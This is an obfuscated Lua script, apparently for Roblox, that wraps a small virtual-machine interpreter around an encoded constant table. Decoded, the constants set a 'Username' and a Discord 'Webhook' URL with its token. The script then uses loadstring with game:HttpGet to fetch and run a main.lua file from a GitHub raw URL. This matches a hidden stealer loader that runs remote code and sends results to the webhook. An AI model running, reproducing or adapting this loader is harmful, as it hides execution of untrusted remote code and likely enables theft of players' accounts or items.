local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v84=v2(v0(v30,16));if v19 then local v90=v5(v84,v19);v19=nil;return v90;else return v84;end end end);local function v20(v31,v32,v33) if v33 then local v85=(v31/((5 -3)^(v32-(928 -((1484 -(226 + 1044)) + 713)))))%((1 + 1)^(((v33-(4 -3)) -(v32-(2 -(118 -(32 + 85))))) + (1 -0))) ;return v85-(v85%(2 -1)) ;else local v86=(2 + 0)^(v32-(620 -(555 + 64))) ;return (((v31%(v86 + v86))>=v86) and (932 -(857 + 74))) or (568 -(367 + 201)) ;end end local function v21() local v34=0;local v35;while true do if (v34==((2 -1) + 0)) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + 1 ;v34=958 -(892 + 65) ;end end end local function v22() local v36=(0 -0) -0 ;local v37;local v38;while true do if (v36==(0 -0)) then v37,v38=v1(v16,v18,v18 + (3 -1) );v18=v18 + (7 -5) ;v36=351 -(87 + 263) ;end if (v36==(181 -(67 + 113))) then return (v38 * (188 + 68)) + v37 ;end end end local function v23() local v39,v40,v41,v42=v1(v16,v18,v18 + 3 + 0 );v18=v18 + 4 ;return (v42 * (16778213 -(915 + 82))) + (v41 * (185570 -120034)) + (v40 * 256) + v39 ;end local function v24() local v43=0 + 0 ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==(2 -0)) then v48=v20(v45,(2976 -1768) -(1069 + 118) ,70 -39 );v49=((v20(v45,32)==((1424 -(630 + 793)) -0)) and  -1) or (1 + 0) ;v43=4 -1 ;end if (v43==(0 + 0)) then v44=v23();v45=v23();v43=792 -(368 + 23 + 400) ;end if (v43==(9 -6)) then if (v48==0) then if (v47==(18 -(10 + 8))) then return v49 * (0 -0) ;else local v97=442 -(416 + 26) ;while true do if (v97==(0 -0)) then v48=1 + 0 ;v46=0;break;end end end elseif (v48==(3621 -1574)) then return ((v47==(438 -(145 + 293))) and (v49 * ((431 -(44 + 137 + 249))/(1486 -(998 + 488))))) or (v49 * NaN) ;end return v8(v49,v48-((1101 -776) + (1583 -(261 + 624))) ) * (v46 + (v47/((2 + 0)^52))) ;end if (((1373 -600) -(201 + (2703 -2132)))==v43) then v46=1139 -(116 + 1022) ;v47=(v20(v45,4 -3 ,12 + 8 ) * ((7 -(2 + 3))^(113 -81))) + v44 ;v43=861 -((1894 -(1020 + 60)) + (154 -109)) ;end end end local function v25(v50) local v51;if  not v50 then v50=v23();if (v50==(1747 -(760 + 987))) then return "";end end v51=v3(v16,v18,(v18 + v50) -(1914 -(1789 + 124)) );v18=v18 + v50 ;local v52={};for v67=1 + 0 , #v51 do v52[v67]=v2(v1(v3(v51,v67,v67)));end return v6(v52);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return 0 -0 ;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();while true do local v69=(function() return 0;end)();while true do if (v69~=(2 -1)) then else if ((1 + 0)~=v53) then else local v95=(function() return 0;end)();while true do if (v95==(2 + 0)) then v53=(function() return 2;end)();break;end if (v95==(396 -(115 + 281))) then v58=(function() return {v55,v56,nil,v57};end)();v59=(function() return v23();end)();v95=(function() return 2 -1 ;end)();end if (v95~=1) then else v60=(function() return {};end)();for v125= #"]",v59 do local v126=(function() return 0;end)();local v127=(function() return;end)();local v128=(function() return;end)();local v129=(function() return;end)();while true do if (v126==(1 + 0)) then v129=(function() return nil;end)();while true do if ((2 -1)~=v127) then else if (v128== #"}") then v129=(function() return v21()~=0 ;end)();elseif (v128==2) then v129=(function() return v24();end)();elseif (v128== #"nil") then v129=(function() return v25();end)();end v60[v125]=(function() return v129;end)();break;end if (0~=v127) then else local v185=(function() return 0;end)();local v186=(function() return;end)();while true do if (v185==(0 -0)) then v186=(function() return 867 -(550 + 317) ;end)();while true do if (v186~=1) then else v127=(function() return 1 -0 ;end)();break;end if ((0 -0)==v186) then v128=(function() return v21();end)();v129=(function() return nil;end)();v186=(function() return 2 -1 ;end)();end end break;end end end end break;end if (v126==0) then v127=(function() return 285 -(134 + 151) ;end)();v128=(function() return nil;end)();v126=(function() return 1666 -(970 + 695) ;end)();end end end v95=(function() return 3 -1 ;end)();end end end break;end if (v69~=(1990 -(582 + 1408))) then else if (v53~=0) then else v54=(function() return function(v101,v102,v103) local v104=(function() return 0 -0 ;end)();local v105=(function() return;end)();while true do if ((0 -0)~=v104) then else v105=(function() return 0 -0 ;end)();while true do if (v105~=(1824 -(1195 + 629))) then else local v180=(function() return 0 -0 ;end)();while true do if ((241 -(187 + 54))~=v180) then else local v187=(function() return 0;end)();while true do if (v187~=(780 -(162 + 618))) then else v101[v102-#"|" ]=(function() return v103();end)();return v101,v102,v103;end end end end end end break;end end end;end)();v55=(function() return {};end)();v56=(function() return {};end)();v57=(function() return {};end)();v53=(function() return 1;end)();end if (v53==(2 + 0)) then v58[ #"91("]=(function() return v21();end)();for v98= #"<",v23() do local v99=(function() return v21();end)();if (v20(v99, #"|", #" ")~=0) then else local v121=(function() return 0;end)();local v122=(function() return;end)();local v123=(function() return;end)();local v124=(function() return;end)();while true do if (v121==(2 + 0)) then if (v20(v123, #" ", #":")~= #"[") then else v124[3 -1 ]=(function() return v60[v124[2 -0 ]];end)();end if (v20(v123,1 + 1 ,1638 -(1373 + 263) )~= #"~") then else v124[ #"19("]=(function() return v60[v124[ #"asd"]];end)();end v121=(function() return 1003 -(451 + 549) ;end)();end if (v121~=(0 + 0)) then else local v169=(function() return 0 -0 ;end)();local v170=(function() return;end)();while true do if (v169~=0) then else v170=(function() return 0 -0 ;end)();while true do if (v170~=(1385 -(746 + 638))) then else v121=(function() return 1;end)();break;end if (v170==0) then v122=(function() return v20(v99,2, #"gha");end)();v123=(function() return v20(v99, #"http",3 + 3 );end)();v170=(function() return 1 -0 ;end)();end end break;end end end if (v121==1) then local v171=(function() return 341 -(218 + 123) ;end)();while true do if (v171==0) then v124=(function() return {v22(),v22(),nil,nil};end)();if (v122==(1581 -(1535 + 46))) then local v188=(function() return 0 + 0 ;end)();local v189=(function() return;end)();while true do if (v188==0) then v189=(function() return 0 + 0 ;end)();while true do if (0~=v189) then else v124[ #"91("]=(function() return v22();end)();v124[ #"0836"]=(function() return v22();end)();break;end end break;end end elseif (v122== #"{") then v124[ #"xxx"]=(function() return v23();end)();elseif (v122==(562 -(306 + 254))) then v124[ #"nil"]=(function() return v23() -(2^16) ;end)();elseif (v122~= #"-19") then else local v195=(function() return 0 + 0 ;end)();local v196=(function() return;end)();while true do if (v195==0) then v196=(function() return 0 -0 ;end)();while true do if (v196==(1467 -(899 + 568))) then v124[ #"xnx"]=(function() return v23() -((2 + 0)^(38 -22)) ;end)();v124[ #".dev"]=(function() return v22();end)();break;end end break;end end end v171=(function() return 1;end)();end if (v171==(604 -(268 + 335))) then v121=(function() return 292 -(60 + 230) ;end)();break;end end end if (v121~=(575 -(426 + 146))) then else if (v20(v123, #"asd", #"19(")~= #"/") then else v124[ #"0313"]=(function() return v60[v124[ #"0313"]];end)();end v55[v98]=(function() return v124;end)();break;end end end end for v100= #":",v23() do v56,v100,v28=(function() return v54(v56,v100,v28);end)();end return v58;end v69=(function() return 1 + 0 ;end)();end end end end local function v29(v61,v62,v63) local v64=v61[1457 -(282 + 1174) ];local v65=v61[813 -(569 + 242) ];local v66=v61[8 -5 ];return function(...) local v70=v64;local v71=v65;local v72=v66;local v73=v27;local v74=1 + 0 ;local v75= -1;local v76={};local v77={...};local v78=v12("#",...) -1 ;local v79={};local v80={};for v87=1251 -(721 + 530) ,v78 do if (v87>=v72) then v76[v87-v72 ]=v77[v87 + (1272 -(945 + 326)) ];else v80[v87]=v77[v87 + (2 -1) ];end end local v81=(v78-v72) + 1 ;local v82;local v83;while true do v82=v70[v74];v83=v82[1 + 0 ];if (v83<=(705 -(271 + 429))) then if ((v83<=2) or (3755<=915)) then if (v83<=(0 + 0)) then local v106=0 + 0 ;local v107;local v108;local v109;local v110;local v111;while true do if (v106==(1500 -(1408 + 92))) then v107=nil;v108,v109=nil;v110=nil;v111=nil;v106=1087 -((999 -538) + 625) ;end if ((3946>3743) and (v106==(1289 -(993 + 295)))) then v80[v82[1 + 1 ]]=v63[v82[1174 -(418 + 753) ]];v74=v74 + 1 ;v82=v70[v74];v111=v82[1 + 1 ];v106=(2 -1) + 1 ;end if (v106==(1 + 2)) then v82=v70[v74];v80[v82[1 + 1 ]]=v82[532 -(406 + 123) ];v74=v74 + ((3963 -2193) -(1749 + 20)) ;v82=v70[v74];v106=1 + 3 ;end if (((1327 -(1249 + 73))==v106) or (1335>=3306)) then for v173=v111,v75 do v107=v107 + 1 + 0 ;v80[v173]=v108[v107];end v74=v74 + (1146 -(466 + 679)) ;v82=v70[v74];v111=v82[4 -2 ];v106=(5 + 12) -11 ;end if ((4844>2253) and (v106==((9201 -7297) -(106 + 1794)))) then v111=v82[1 + 1 ];v108,v109=v73(v80[v111](v13(v80,v111 + 1 + 0 ,v82[8 -5 ])));v75=(v109 + v111) -1 ;v107=0 -0 ;v106=5;end if ((452==452) and (v106==(121 -(4 + 110)))) then v74=v74 + (585 -((810 -(239 + 514)) + 527)) ;v82=v70[v74];v74=v82[1430 -(41 + 1386) ];break;end if (v106==(105 -(17 + 86))) then v110=v80[v82[2 + 1 + 0 ]];v80[v111 + 1 ]=v110;v80[v111]=v110[v82[1333 -(797 + 532) ]];v74=v74 + ((1 + 0) -0) ;v106=8 -5 ;end if ((v106==(172 -(122 + 15 + 29))) or (4557<2087)) then v80[v111]=v80[v111](v13(v80,v111 + 1 ,v75));v74=v74 + 1 ;v82=v70[v74];v80[v82[2 -0 ]]();v106=22 -15 ;end end elseif (v83==1) then if (v80[v82[2 + 0 ]]==v82[1 + 3 ]) then v74=v74 + (1 -0) ;else v74=v82[68 -((70 -40) + 35) ];end else v80[v82[2 + 0 ]]();end elseif ((3874==3874) and (v83<=(1260 -(1043 + 214)))) then v63[v82[3]]=v80[v82[7 -5 ]];elseif (v83>((2418 -(373 + 829)) -(323 + 889))) then v80[v82[5 -(734 -(476 + 255)) ]]=v63[v82[583 -(361 + 219) ]];else v63[v82[(1453 -(369 + 761)) -(53 + 267) ]]=v80[v82[1 + 1 ]];v74=v74 + (414 -(9 + 6 + 398)) ;v82=v70[v74];v80[v82[2 -0 ]]=v82[985 -(18 + 964) ];v74=v74 + (3 -(3 -1)) ;v82=v70[v74];v63[v82[241 -(64 + 174) ]]=v80[v82[1 + 1 + 0 ]];v74=v74 + 1 + 0 ;v82=v70[v74];v80[v82[2]]=v82[(1262 -409) -(20 + 830) ];v74=v74 + 1 ;v82=v70[v74];v74=v82[3 + 0 ];end elseif ((v83<=8) or (1938>4935)) then if (v83<=(132 -(116 + 10))) then local v114=v82[1 + 1 ];v80[v114]=v80[v114](v13(v80,v114 + (739 -((878 -(144 + 192)) + 196)) ,v75));elseif (v83==(14 -(223 -(42 + 174)))) then v80[v82[1 + 1 ]]=v82[2 + 1 ];else do return;end end elseif (v83<=9) then local v116=0;local v117;local v118;local v119;local v120;while true do if ((v116==(1 + 0 + 0)) or (4255<3423)) then v75=(v119 + v117) -(2 -1) ;v120=0 -0 ;v116=1553 -(1126 + 425) ;end if (v116==(407 -(118 + 287))) then for v177=v117,v75 do v120=v120 + (3 -(2 + 0)) ;v80[v177]=v118[v120];end break;end if ((1454<=2491) and (v116==(1121 -(118 + 1003)))) then v117=v82[5 -3 ];v118,v119=v73(v80[v117](v13(v80,v117 + (378 -(142 + 235)) ,v82[3])));v116=4 -3 ;end end elseif (v83>(3 + 7)) then v74=v82[980 -(553 + 424) ];else local v145=v82[3 -1 ];local v146=v80[v82[3 + 0 ]];v80[v145 + 1 + 0 ]=v146;v80[v145]=v146[v82[4]];end v74=v74 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0A3Q00028Q00026Q00F03F030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403403Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F646F736C6F626F6479646F6564792F782F6D61696E2F6D61696E2E6C756103083Q00557365726E616D65030C3Q006A616D69652Q32333536373803073Q00576562682Q6F6B03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313238392Q35333430323Q31353930352Q302F52425269467669322Q725F32466D2D6C56374A592Q726E337A66716D654474302Q764A376B684E596B582D78463042796D503262707456364A314D7A4B45334462734B3200143Q0012073Q00013Q0026013Q000B0001000200040B3Q000B0001001205000100033Q00122Q000200043Q00202Q00020002000500122Q000400066Q000200046Q00013Q00024Q00010001000100044Q001300010026013Q00010001000100040B3Q00010001001207000100083Q001204000100073Q00122Q0001000A3Q00122Q000100093Q00124Q00023Q00044Q000100012Q00083Q00017Q00",v9(),...);